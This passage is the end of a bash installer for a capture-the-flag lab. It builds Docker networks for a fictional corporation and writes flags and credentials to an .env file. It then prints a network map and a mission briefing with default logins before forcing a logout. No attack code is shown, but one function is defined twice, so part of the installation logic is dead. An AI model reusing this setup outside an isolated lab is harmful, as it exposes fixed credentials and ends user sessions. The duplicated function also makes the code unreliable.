  # Gibson Mainframe (deployed dynamically)
  gibson:
    build: ./gibson
    container_name: gibson-mainframe-simulator
    ports: ["2023:2023", "2111:2111", "8081:8081", "8443:8443"]
    networks:
      it_corp_net:
        ipv4_address: ${GIBSON_IP}
    stdin_open: true
    tty: true
    healthcheck:
      test: ["CMD", "nc", "-z", "localhost", "2023"]
      interval: 15s
      timeout: 5s
      retries: 3
      start_period: 45s
    profiles: ["gibson"]

networks:
  control_net: 
    ipam: 
      driver: default
      config: 
        - subnet: ${CONTROL_NET_SUBNET}
  dmz_net: 
    ipam: 
      driver: default
      config: 
        - subnet: ${DMZ_NET_SUBNET}
  it_corp_net: 
    ipam: 
      driver: default
      config: 
        - subnet: ${IT_CORP_NET_SUBNET}
  ot_secure_net: 
    internal: true
    ipam: 
      driver: default
      config: 
        - subnet: ${OT_SECURE_NET_SUBNET}
  blackswan_c2_net: 
    internal: true
    ipam: 
      driver: default
      config: 
        - subnet: ${BLACKSWAN_NET_SUBNET}
EOF

    log_info "Enhanced docker-compose.yml with health checks written"
}



create_env_file() {
    echo "[*] Creating .env file for docker-compose..."
    cat > "$PROJECT_DIR/.env" << EOF
# Flags, NPCs, and Passwords
FLAG_PHASE1=$FLAG_PHASE1
FLAG_PHASE2=$FLAG_PHASE2
FLAG_PHASE3=$FLAG_PHASE3
FLAG_PHASE4=$FLAG_PHASE4
FLAG_PHASE5=$FLAG_PHASE5
FLAG_PHASE6=$FLAG_PHASE6
BONUS_FLAG=$BONUS_FLAG
CANARY_CODENAME=$CANARY_CODENAME
DIRECTOR_FLAG_PORT=$DIRECTOR_FLAG_PORT
CANARY_GHOST_PORT=$CANARY_GHOST_PORT
GEMINI_API_KEY=$GEMINI_API_KEY
SKID_USER=$SKID_USER
SKID_PASS=$SKID_PASS
# All Network Subnets and IPs
CONTROL_NET_SUBNET=$CONTROL_NET_SUBNET
DIRECTOR_IP=$DIRECTOR_IP
DMZ_NET_SUBNET=$DMZ_NET_SUBNET
WEB_DMZ_IP=$WEB_DMZ_IP
SSH_JUMP_DMZ_IP=$SSH_JUMP_DMZ_IP
SSH_JUMP_CONTROL_IP=$SSH_JUMP_CONTROL_IP
IT_CORP_NET_SUBNET=$IT_CORP_NET_SUBNET
FILESERV_IT_IP=$FILESERV_IT_IP
ENG_WORKSTATION_IP=$ENG_WORKSTATION_IP
GIBSON_IP=$GIBSON_IP
OT_SECURE_NET_SUBNET=$OT_SECURE_NET_SUBNET
PLC_SIM_IP=$PLC_SIM_IP
HMI_DASH_IP=$HMI_DASH_IP
SCADA_SERVER_IP=$SCADA_SERVER_IP
HISTORIAN_DB_IP=$HISTORIAN_DB_IP
BLACKSWAN_NET_SUBNET=$BLACKSWAN_NET_SUBNET
BLACKSWAN_C2_IP=$BLACKSWAN_C2_IP
TOR_SERVICE_IP=$TOR_SERVICE_IP
EOF
}





run_main_installation_logic() {
    log_info "Installing host dependencies with error handling..."
    
    # Update package lists with retry logic
    local max_attempts=3
    for attempt in $(seq 1 $max_attempts); do
        if apt-get update; then
            log_debug "Package list update: OK (attempt $attempt)"
            break
        else
            log_warn "Package list update failed (attempt $attempt/$max_attempts)"
            if [[ $attempt -eq $max_attempts ]]; then
                log_fatal "Failed to update package lists after $max_attempts attempts"
            fi
            sleep 5
        fi
    done
    
    # Install packages with version awareness
    local packages=(
        "docker.io"
        "docker-compose" 
        "git"
        "steghide"
        "python3-pip"
        "tree"
        "imagemagick"
        "wget"
        "dconf-cli"
        "mpv"
        "yt-dlp"
        "python3-tk"
        "python3-pil"
        "python3-pil.imagetk"
        "unzip"
        "curl"
        "netstat-nat"
        "net-tools"
    )
    
    log_info "Installing required packages: ${packages[*]}"
    if apt-get install -y "${packages[@]}"; then
        log_info "Package installation: OK"
    else
        log_fatal "Failed to install required packages"
    fi
    
    # Install Python dependencies with error handling
    log_info "Installing Python dependencies..."
    local python_packages=("python3-pynput")
    for pkg in "${python_packages[@]}"; do
        if apt-get install -y "$pkg"; then
            log_debug "Python package installed: $pkg"
        else
            log_warn "Failed to install Python package: $pkg"
        fi
    done
    
    # Verify Docker installation
    if ! systemctl is-active --quiet docker; then
        log_info "Starting Docker service..."
        systemctl start docker || log_fatal "Failed to start Docker service"
    fi
    
    if ! systemctl is-enabled --quiet docker; then
        log_info "Enabling Docker service..."
        systemctl enable docker || log_warn "Failed to enable Docker service"
    fi
    
    # Add current user to docker group if not root
    if [[ -n "$SUDO_USER" ]] && [[ "$SUDO_USER" != "root" ]]; then
        usermod -aG docker "$SUDO_USER" || log_warn "Failed to add $SUDO_USER to docker group"
        log_info "User $SUDO_USER added to docker group (logout/login required)"
    fi
    
    log_info "Host dependencies installation completed successfully"
}

# --- Enhanced Main Installation with All Improvements ---
run_main_installation_logic() {
    log_info "Starting enhanced GhostFrame CTF installation..."
    
    # Pre-flight checks
    check_system_resources || log_fatal "System resource checks failed"
    test_network_connectivity || log_warn "Network connectivity issues detected"
    
    # Installation steps with enhanced logging and error handling
    log_info "Starting installation steps..."
    
    # Debug PROJECT_DIR at the start
    echo "[DEBUG] Main installation: PROJECT_DIR = $PROJECT_DIR"
    echo "[DEBUG] Main installation: Current working directory = $(pwd)"
    
    prompt_for_gemini_key || log_warn "Gemini key prompt failed, continuing..."
    install_host_dependencies || log_fatal "Host dependencies installation failed"
    populate_host_users_with_clues || log_fatal "User population failed"
    deploy_ghost_logger_service || log_warn "Ghost logger service deployment failed, continuing..."
    
    echo "[DEBUG] About to call setup_project_directories..."
    setup_project_directories || log_fatal "Project directory setup failed"
    echo "[DEBUG] setup_project_directories completed successfully"
    
    echo "[DEBUG] About to call create_docker_assets..."
    create_docker_assets || log_fatal "Docker assets creation failed"
    echo "[DEBUG] create_docker_assets completed successfully"
    
    generate_tor_hostname_and_puzzle || log_warn "Tor puzzle generation failed, continuing..."
    write_docker_compose_and_dockerfiles || log_fatal "Docker compose and Dockerfiles creation failed"
    create_env_file || log_fatal "Environment file creation failed"
    create_cleanup_script || log_warn "Cleanup script creation failed, continuing..."
    
    # Final verification of critical files
    log_info "Verifying critical files were created..."
    local critical_files=(
        "$PROJECT_DIR/director/director.py"
        "$PROJECT_DIR/director/skid_controller.py"
        "$PROJECT_DIR/web_dmz/www/index.php"
        "$PROJECT_DIR/ssh_jump/start.sh"
        "$PROJECT_DIR/docker-compose.yml"
        "$PROJECT_DIR/.env"
    )
    
    local missing_files=()
    for file in "${critical_files[@]}"; do
        if [ ! -f "$file" ]; then
            missing_files+=("$file")
        fi
    done
    
    if [ ${#missing_files[@]} -gt 0 ]; then
        log_error "Critical files missing:"
        for file in "${missing_files[@]}"; do
            log_error "  - $file"
        done
        log_fatal "Installation incomplete due to missing critical files"
    fi
    
    log_info "All critical files verified successfully."
    
    log_info "Building and launching initial Docker containers..."
    cd "$PROJECT_DIR"
    
    # Build with progress monitoring
    log_info "Building Docker images (this may take several minutes)..."
    if docker-compose build --parallel; then
        log_info "Docker image build: OK"
    else
        log_fatal "Docker image build failed"
    fi
    
    # Deploy core services
    log_info "Deploying core services..."
    if docker-compose up -d director web-dmz ssh-jump tor_service; then
        log_info "Core services deployment initiated"
    else
        log_fatal "Failed to deploy core services"
    fi
    
    # Verify deployment with health checks
    verify_container_deployment || log_warn "Some services may not be fully healthy"
    
    log_info "Enhanced installation completed successfully"
}

display_ascii_network_map() {
    clear
    echo "=============================================================================="
    echo "       ACHERON CORPORATION NETWORK TOPOLOGY - LIVE RECONSTRUCTION"
    echo "=============================================================================="
    sleep 2
    echo
    echo "  [ YOUR VM (GHOST) ]"
    echo "         |"
    echo "         |  Initial Access (HTTP:80, SSH:2222)"
    echo "         V"
    echo "  +--------------------------------------------------------------------------+"
    echo "  |  ACHERON DMZ NETWORK (${DMZ_NET_SUBNET})                               |"
    echo "  |                                                                          |"
    echo "  |   +--> [ web-dmz ] (${WEB_DMZ_IP})                                      |"
    echo "  |   |                                                                      |"
    echo "  |   +--> [ ssh-jump ] (${SSH_JUMP_DMZ_IP}) <-----------------------------+"
    echo "  |                                                                          |"
    echo "  +--------------------------------------------------------------------------+"
    echo "         |                                                                   |"
    echo "         | Pivot Point (Access to Internal Nets)                             |"
    echo "         |                                                                   |"
    echo "  +------V-------------------------------------------------------------------+"
    echo "  |  INTERNAL IT & CONTROL NETWORKS                                          |"
    echo "  |                                                                          |"
    echo "  |  [ IT CORP NET (${IT_CORP_NET_SUBNET}) ]                                   |"
    echo "  |   |                                                                      |"
    echo "  |   +-- fileserv-it      [${FILESERV_IT_IP}]                               |"
    echo "  |   |                                                                      |"
    echo "  |   +-- gibson-mainframe [${GIBSON_IP}] (STATUS: OFFLINE - DYNAMIC)    |"
    echo "  |   |                                                                      |"
    echo "  |   +-- eng-workstation  [${ENG_WORKSTATION_IP}] <-----------------------+"
    echo "  |                                                                          |"
    echo "  |  [ CONTROL NET (${CONTROL_NET_SUBNET}) ]                                   |"
    echo "  |   |                                                                      |"
    echo "  |   +-- director [${DIRECTOR_IP}] (Flag/NPC Controller)                  |"
    echo "  |   |                                                                      |"
    echo "  |   +-- tor-svc  [${TOR_SERVICE_IP}] (Shadow Operative Surveillance)      |"
    echo "  |                                                                          |"
    echo "  +--------------------------------------------------------------------------+"
    echo "                                                                             |"
    echo "                                                                             |"
    echo "  +--------------------------------------------------------------------------V-+"
    echo "  |  HIGH-SECURITY OT & C2 ZONES (Access from eng-workstation)                 |"
    echo "  |                                                                          |"
    echo "  |  [ OT SECURE NET (${OT_SECURE_NET_SUBNET}) - INTERNAL ]                        |"
    echo "  |   |                                                                      |"
    echo "  |   +-- leviathan-plc    [${PLC_SIM_IP}]                                   |"
    echo "  |   +-- leviathan-hmi    [${HMI_DASH_IP}]                                   |"
    echo "  |   +-- leviathan-scada  [${SCADA_SERVER_IP}]                              |"
    echo "  |   +-- leviathan-hist   [${HISTORIAN_DB_IP}]                              |"
    echo "  |                                                                          |"
    echo "  |  [ BLACKSWAN C2 NET (${BLACKSWAN_NET_SUBNET}) - INTERNAL ]                  |"
    echo "  |   |                                                                      |"
    echo "  |   +-- blackswan-c2 [${BLACKSWAN_C2_IP}]                                |"
    echo "  |                                                                          |"
    echo "  +--------------------------------------------------------------------------+"
    echo
    echo
    read -n 1 -s -r -p "Network map displayed. Press any key to view mission briefing..."
}

display_final_instructions_and_logout() {
    clear
    HOST_IP=$(hostname -I | awk '{print $1}')
    echo "========================================================================"
    echo "          NU11DIVISION DIRECTIVE // OPERATION LEVIATHAN"
    echo "========================================================================"
    echo
    echo "TO: Candidate"
    echo "FROM: Zer0Frame"
    echo "SUBJECT: What is Leviathan?."
    echo "------------------------------------------------------------------------"
    echo
    echo "This ain't much of a welcome, but you're Nu11Division now, so we thought"
    echo "you should know...  0xGhost might be alive.. He.. or someone reached out"
    echo
    echo "A single DM.... All it said..."
    echo "Leviathan is LIVE....."
    echo "Find the truth."
    echo ""
    echo "Our intel leads us to believe Acheron Corporation is the new front for"
    echo "TargetCorp.. Find what 0xGhost was after. Find out what happened to him."
    echo
    echo "THE LIVE ENVIRONMENT IS COMPROMISED AND UNSTABLE:"
    echo
    echo "   - THE ADVERSARY: We've detected a low-skill hacker,"
    echo "     making noise in their DMZ. His chaos is a threat to our stealth."
    echo "     Neutralizing him is your first priority."
    echo
    echo "   - THE INSIDER: 'Canary' is the only way we're gonna get to Leviathan"
    echo "     Establishing contact is your only path to the high-security" 
    echo "     OT network."
    echo
    echo "   - THE ANOMALY: Be advised, there are whispers of a 'Shadow Operative'"
    echo "     on the host system. Their motives are unknown. Trust no one."
    echo
    echo "------------------------------------------------------------------------"
    echo "                  INITIAL ACCESS & LOGIN"
    echo "------------------------------------------------------------------------"
    echo
    echo "You will inherit the 'ghost' user account on the deployed systems."
    echo "Log into this VM with the credentials he used. From there, pivot into"
    echo "the Acheron network."
    echo
    echo "   - Login User:     ghost"
    echo "   - Login Password: ghost"
    echo
    echo "   - Acheron Entry Vectors (from this VM):"
    echo "       Public Web Server: http://$HOST_IP"
    echo "       Jumpbox SSH:       ssh ghost@$HOST_IP -p 2222"
    echo
    echo "Find the truth behind Project Leviathan."
    echo "Don't disappoint me."
    echo
    echo "-ZF"
    echo "========================================================================"
    echo
    read -n 1 -s -r -p "Press any key to log out and begin your mission..."
    echo
    if [ -n "$SUDO_USER" ] && [ "$SUDO_USER" != "root" ]; then
        loginctl terminate-user "$SUDO_USER"
    fi
}

# --- Main Execution Flow ---
main() {
    prompt_for_confirmation
    clear
    echo "================================================================"
    echo "       GHOSTFRAME: DEFINITIVE EDITION - INSTALLATION"
    echo "================================================================"
    echo
    echo "Starting installation process..."
    echo "Log file: $INSTALL_LOG_FILE"
    echo "================================================================"
    echo
    
    # Run the main installation logic directly
    run_main_installation_logic
    
    echo "================================================================"
    echo "       INSTALLATION COMPLETE"
    echo "================================================================"
    echo
    display_ascii_network_map
    display_final_instructions_and_logout
}

main "$@"
